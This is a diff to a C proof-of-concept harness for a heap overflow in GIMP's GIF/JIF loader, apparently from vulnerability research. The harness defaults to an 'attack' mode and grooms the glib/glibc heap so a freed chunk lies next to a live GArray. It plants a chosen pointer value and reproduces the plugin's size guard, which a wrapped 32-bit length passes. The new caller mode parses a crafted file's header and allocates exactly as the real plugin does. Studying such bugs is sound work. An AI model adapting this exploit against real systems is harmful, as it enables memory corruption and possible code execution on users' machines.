@@ -104,7 +104,7 @@ hexdump (const unsigned char *p, size_t n)
  * GIMP object/palette construction is the only omitted part of load_image(). */
 static int
 parse_jif_header (FILE *fd, gint *len, gint *height, gboolean *alpha,
-                  guchar *bpp)
+                  guchar *bpp, gint *screenw, gint *screenh)
 {
   guchar buf[768], c, size;
 
@@ -112,6 +112,8 @@ parse_jif_header (FILE *fd, gint *len, gint *height, gboolean *alpha,
     return 0;
   if (! ReadOK (fd, buf, 7))
     return 0;
+  *screenw = buf[0] + (buf[1] << 8);
+  *screenh = buf[2] + (buf[3] << 8);
   if ((buf[4] & 0x80) && ! ReadOK (fd, buf, 3 * (1 << ((buf[4] & 7) + 1))))
     return 0;
   *alpha = FALSE;
@@ -156,15 +158,19 @@ main (int argc, char **argv)
 {
   setvbuf (stdout, NULL, _IONBF, 0);
   const char *mode = (argc > 1) ? argv[1] : "attack";
-  int file_mode = (! strcmp (mode, "file") || ! strcmp (mode, "fileptr"));
+  int caller_mode = (! strcmp (mode, "caller") || ! strcmp (mode, "callerpub"));
+  int file_mode = (! strcmp (mode, "file") || ! strcmp (mode, "fileptr") ||
+                   caller_mode);
   FILE *jif = NULL;
   guchar bpp = 8;
   unsigned char chosen_ptr[8] = { 0x43, 0x42, 0x41, 0x00, 0x00, 0x7f, 0x00, 0x00 };
   guchar dest[8192];
+  guchar *caller_dest = NULL;
   GimpImage *image = NULL;
   GError *error = NULL;
-  gint len, height;
+  gint len, height, screenw = 0, screenh = 0;
   gboolean alpha;
+  guint parsed_ds = 0;
   size_t outlen, i, changed = 0;
   gboolean rc;
 
@@ -179,15 +185,42 @@ main (int argc, char **argv)
           return 2;
         }
       stream_file = jif;
-      if (! parse_jif_header (jif, &len, &height, &alpha, &bpp))
+      if (! parse_jif_header (jif, &len, &height, &alpha, &bpp,
+                              &screenw, &screenh))
         {
           fprintf (stderr, "JIF header parse failed\n");
           return 2;
         }
+      parsed_ds = (guint) ((unsigned) len * (unsigned) height);
+      if (alpha)
+        parsed_ds *= 2;
       printf ("FILE_FIELDS len=%d height=%d bpp=%u alpha=%d product=0x%08x data_size=%u\n",
               len, height, bpp, alpha ? 1 : 0,
               (unsigned) (len * height),
               (unsigned) (len * height * (alpha ? 2 : 1)));
+    }
+
+  /* Reproduce the pinned ReadImage() caller conditions before the call:
+   * file-gif-load-vulnerable.c:1348 size guard and :1376 dest allocation.
+   * The guard divides by G_MAXSIZE (64-bit on this host), so a wrapped
+   * 32-bit product is not rejected. g_try_malloc probes the same glib
+   * allocator without the g_malloc abort on failure; if it returned NULL
+   * the real plugin would terminate before reaching ReadJeffsImage(). */
+  if (caller_mode)
+    {
+      gsize dest_size = (gsize) len * (gsize) height * (alpha ? 2 : 1);
+      gsize limit = G_MAXSIZE / (gsize) height / (alpha ? 2 : 1);
+      int guard_passes = (len > limit) ? 0 : 1;
+      printf ("CALLER screen=%dx%d len=%d height=%d alpha=%d limit=%zu\n",
+              screenw, screenh, len, height, alpha ? 1 : 0, limit);
+      printf ("GUARD_PASSES=%d DEST_SIZE=%zu\n", guard_passes, dest_size);
+      caller_dest = (guchar *) g_try_malloc (dest_size);
+      printf ("DEST_ALLOC=%s DEST_PTR=%p\n",
+              caller_dest ? "OK" : "NULL", (void *) caller_dest);
+      if (! caller_dest)
+        return 3;
+      memset (caller_dest, 0x5a, 16);
+      printf ("DEST_FIRST=%02x\n", caller_dest[0]);
     }
 
   if (! strcmp (mode, "safe"))
@@ -217,7 +250,7 @@ main (int argc, char **argv)
   /* Groom the real glib/glibc heap: a freed 272-byte chunk immediately
    * followed by a live GLib container. GArray's control struct is
    * malloc-allocated (GString uses GSlice magazines). */
-  size_t groom_bytes = file_mode ? 8 : 256;
+  size_t groom_bytes = file_mode ? (parsed_ds > 16 ? 256 : 8) : 256;
   unsigned char *groom = g_malloc (groom_bytes);
   memset (groom, 0x5a, groom_bytes);
   printf ("LAYOUT groom=%p usable=%zu\n", (void *) groom,
@@ -235,7 +268,8 @@ main (int argc, char **argv)
   g_free (groom);  /* tcache: pinned g_try_malloc() should reuse this chunk */
   if (! file_mode)
     build_stream (outlen);
-  rc = ReadJeffsImage (NULL, dest, file_mode ? bpp : 8,
+  rc = ReadJeffsImage (NULL, caller_dest ? caller_dest : dest,
+                       file_mode ? bpp : 8,
                        len, height, alpha, &image, &error);
 
   printf ("MODE=%s PAYLOAD=%02x RC=%d ERR=%s\n",
